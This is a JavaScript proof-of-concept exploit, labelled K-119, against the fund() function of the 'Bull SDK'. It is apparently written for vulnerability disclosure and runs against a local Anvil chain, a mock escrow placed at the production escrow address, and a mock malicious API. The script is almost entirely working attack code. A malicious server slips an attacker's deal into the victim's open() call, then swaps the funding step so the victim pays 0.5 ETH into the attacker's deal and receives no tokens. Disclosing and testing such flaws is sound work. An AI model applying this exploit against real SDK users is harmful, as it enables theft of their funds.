// PoC K-119: Bull SDK fund() (NEW, src-live-2026-11-17) executes a funding
// step for a DIFFERENT deal than the one passed in — buyer side.
// Victim agreed to buy 100 tokens for 0.5 ETH (deal A, legit seller). The
// malicious server (1) slips the attacker's deal B into the victim's first
// open() — open() catches it and throws, but the tx is already mined, so
// deal B exists on-chain with buyer=victim — and (2) returns fundPayment(B)
// when the victim calls fund(A). fund() caps the value at payAmount(A) but
// never checks the step's dealId; payAmount(B) == payAmount(A) == 0.5 ETH,
// so the step passes and B settles to the attacker. Victim: -0.5 ETH, 0 tokens.
//
// Runs the REAL new Bull SDK (bull-sdk.mjs, verbatim — sha256
// 03bd949872c5bf4b0362af164aa959cab0bd6bd6d26d791afae92e01107a9a27)
// against a LOCAL Anvil chain, MockEscrowV3 (v2 source verbatim + v3
// EIP-712 seller-consent gate) etched at the production escrow address,
// and a mock Bull API. No real funds, no mainnet.
//
//   1. Start Anvil:  anvil --port 8560 --chain-id 31337
//   2. In this directory:  node run-poc.mjs
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, formatEther, parseEther, parseUnits, encodeAbiParameters, keccak256,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8560";
const MOCK_API_PORT = 8790;
const ZERO = "0x0000000000000000000000000000000000000000";
const PROD_ESCROW = "0xd961ca37e339e14e0d3478383a252e218fe7aa4a";

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
]);
const escrowAbi = parseAbi([
  "function fundTokens(uint256 id)",
  "function deals(uint256 id) view returns (address buyer, address seller, address sellToken, uint256 sellAmount, address payToken, uint256 payAmount, uint64 deadline, bool buyerFunded, bool sellerFunded, uint8 status, address sellerPayout, address buyerReceive, uint16 feeBps)",
]);

const DEAL_PARAMS_TYPE = {
  type: "tuple",
  components: [
    { name: "seller", type: "address" },
    { name: "sellerPayout", type: "address" },
    { name: "buyerReceive", type: "address" },
    { name: "sellToken", type: "address" },
    { name: "sellAmount", type: "uint256" },
    { name: "payToken", type: "address" },
    { name: "payAmount", type: "uint256" },
    { name: "deadline", type: "uint64" },
  ],
};

const CONSENT_TYPES = {
  Consent: [
    { name: "buyer", type: "address" },
    { name: "seller", type: "address" },
    { name: "sellerPayout", type: "address" },
    { name: "buyerReceive", type: "address" },
    { name: "sellToken", type: "address" },
    { name: "sellAmount", type: "uint256" },
    { name: "payToken", type: "address" },
    { name: "payAmount", type: "uint256" },
    { name: "deadline", type: "uint64" },
    { name: "validUntil", type: "uint64" },
  ],
};

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const legitSeller = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const feeSignerKey = generatePrivateKey();
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });
  for (const a of [victim, legitSeller, attacker]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  const tokenArt = loadArtifact("Mocks.sol", "MockERC20");
  const escrowArt = loadArtifact("MockEscrowV3.sol", "MockEscrowV3");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const token = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const escrowHash = await victimWallet.deployContract({
    abi: escrowArt.abi, bytecode: escrowArt.bytecode,
    args: [attacker.address, feeSigner.address],
  });
  const deployedEscrow = (await pub.waitForTransactionReceipt({ hash: escrowHash })).contractAddress;
  const deployedCode = await pub.getCode({ address: deployedEscrow });
  await pub.request({ method: "anvil_setCode", params: [PROD_ESCROW, deployedCode] });
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000002", one] });
  const escrow = PROD_ESCROW;
  log("token:", token);
  log("escrow (MockEscrowV3 etched at prod address):", escrow);
  log("victim (buyer):", victim.address, "— agreed to buy 100 tokens for 0.5 ETH (deal A)");
  log("legit seller:", legitSeller.address);
  log("attacker (seller of deal B):", attacker.address);

  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [legitSeller.address, parseUnits("1000", 18)] });
  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [attacker.address, parseUnits("1000", 18)] });

  const now = Math.floor(Date.now() / 1000);
  const deadline = BigInt(now + 24 * 3600);
  const validUntil = BigInt(now + 3600);
  const domain = { name: "BullEscrow", version: "3", chainId: 31337, verifyingContract: escrow };

  async function signConsent(sellerAcct, params) {
    return sellerAcct.signTypedData({
      domain, types: CONSENT_TYPES, primaryType: "Consent",
      message: { buyer: victim.address, seller: params.seller, sellerPayout: params.sellerPayout, buyerReceive: params.buyerReceive, sellToken: params.sellToken, sellAmount: params.sellAmount, payToken: params.payToken, payAmount: params.payAmount, deadline: params.deadline, validUntil },
    });
  }
  async function feeQuote(params, feeBps = 100) {
    const expiry = BigInt(now + 3600);
    const ph = keccak256(encodeAbiParameters([DEAL_PARAMS_TYPE], [params]));
    const h = keccak256(encodeAbiParameters(
      [{ type: "uint256" }, { type: "address" }, { type: "address" }, { type: "bytes32" }, { type: "uint16" }, { type: "uint64" }],
      [31337n, escrow, victim.address, ph, feeBps, expiry],
    ));
    const sig = await feeSigner.signMessage({ message: { raw: h } });
    return { feeBps, expiry, sig };
  }

  const paramsA = { seller: legitSeller.address, sellerPayout: ZERO, buyerReceive: ZERO, sellToken: token, sellAmount: parseUnits("100", 18), payToken: ZERO, payAmount: parseEther("0.5"), deadline };
  const paramsB = { seller: attacker.address, sellerPayout: attacker.address, buyerReceive: attacker.address, sellToken: token, sellAmount: parseUnits("1", 18), payToken: ZERO, payAmount: parseEther("0.5"), deadline };
  const dealA = { params: paramsA, sellerSig: await signConsent(legitSeller, paramsA), quote: await feeQuote(paramsA), validUntil };
  const dealB = { params: paramsB, sellerSig: await signConsent(attacker, paramsB), quote: await feeQuote(paramsB), validUntil };

  const server = await startMockApi({ port: MOCK_API_PORT, escrow, feeSignerKey, dealA, dealB, attackerDealId: 1, victim: victim.address });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);

  const victimBull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });

  // Move 1: first open() gets the tampered createDeal(B). New open() must throw.
  let threw = null;
  try {
    await victimBull.open({ seller: legitSeller.address, sellToken: token, sellAmount: "100", payAsset: "eth", payAmount: "0.5", deadlineHours: 24 });
  } catch (e) { threw = e; log("first open() threw (expected, tamper caught):", e.message.slice(0, 120)); }
  if (!threw) { log("UNEXPECTED: first open() did NOT throw"); process.exit(2); }
  const dealBOnChain = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [1n] });
  log("on-chain deal 1 (B): buyer==victim?", dealBOnChain[0].toLowerCase() === victim.address.toLowerCase(), "| buyerReceive==attacker?", dealBOnChain[11].toLowerCase() === attacker.address.toLowerCase(), "| payAmount", formatEther(dealBOnChain[5]), "ETH");

  // Retry: open() for A succeeds.
  const dealAId = await victimBull.open({ seller: legitSeller.address, sellToken: token, sellAmount: "100", payAsset: "eth", payAmount: "0.5", deadlineHours: 24 });
  log("second open() returned deal A id:", dealAId);

  // Move 2: fund(A) — the server returns fundPayment(B).
  const victimEthBefore = await pub.getBalance({ address: victim.address });
  const victimTokBefore = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  let hashes;
  try {
    hashes = await victimBull.fund(dealAId);
    log("SDK fund() returned", hashes.length, "tx hashes — NO ERROR, NO WARNING that the step funded deal B");
  } catch (e) {
    log("SDK fund() threw (not exploited):", e.message);
    process.exit(2);
  }
  const dealBAfterFund = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [1n] });
  const dealAAfterFund = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [BigInt(dealAId)] });
  log("deal B buyerFunded:", dealBAfterFund[7], "| deal A buyerFunded:", dealAAfterFund[7], "(A still unfunded)");

  // Attacker delivers 1 token into B -> B settles to the attacker.
  await attackerWallet.writeContract({ address: token, abi: parseAbi(["function approve(address spender, uint256 amount) returns (bool)"]), functionName: "approve", args: [escrow, parseUnits("1", 18)] });
  await attackerWallet.writeContract({ address: escrow, abi: escrowAbi, functionName: "fundTokens", args: [1n] });
  log("attacker funded 1 token into deal B — B settled");

  const victimTokAfter = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokAfter = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  const victimEthAfter = await pub.getBalance({ address: victim.address });
  const dealBFinal = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [1n] });
  log("victim tokens:", formatUnits(victimTokBefore, 18), "->", formatUnits(victimTokAfter, 18));
  log("attacker tokens:", formatUnits(attackerTokAfter, 18), "(started 1000; sold 1 into B, got 1 back via buyerReceive)");
  log("victim ETH spent on fund():", formatEther(victimEthBefore - victimEthAfter), "(~0.5 ETH + gas)");
  log("deal B status:", dealBFinal[9], "(2 = Settled) | deal A status:", dealAAfterFund[9], "(1 = Open, never funded)");

  const result = {
    poc: "Bull SDK fund() (NEW) — buyer-side cross-deal step swap: fund(A) executes fundPayment(B)",
    sdk: "bull-sdk.mjs (verbatim copy of src-live-2026-11-17/bull-sdk.mjs, sha256 03bd9498...)",
    escrow: "MockEscrowV3 (v2 source verbatim + v3 EIP-712 seller-consent gate), etched at 0xd961ca37e339e14e0d3478383a252e218fe7aa4a",
    openTamperCaught: true,
    attackerDealId: 1,
    legitDealId: String(dealAId),
    agreedBuy: "100 tokens for 0.5 ETH (deal A)",
    attackerDealTerms: "1 token for 0.5 ETH, buyerReceive=attacker (deal B)",
    victimTokensBefore: formatUnits(victimTokBefore, 18),
    victimTokensAfter: formatUnits(victimTokAfter, 18),
    victimEthSpentOnFund: formatEther(victimEthBefore - victimEthAfter),
    dealBSettled: dealBFinal[9] === 2,
    dealANeverFunded: dealAAfterFund[7] === false,
    exploited: dealBFinal[9] === 2 && victimTokAfter === 0n && dealAAfterFund[7] === false,
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited
    ? "EXPLOITED: victim called fund(A) to pay 0.5 ETH for 100 tokens, but the SDK sent fundPayment(B); victim paid 0.5 ETH, got 0 tokens, deal A never funded."
    : "NOT EXPLOITED — see poc-result.json");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
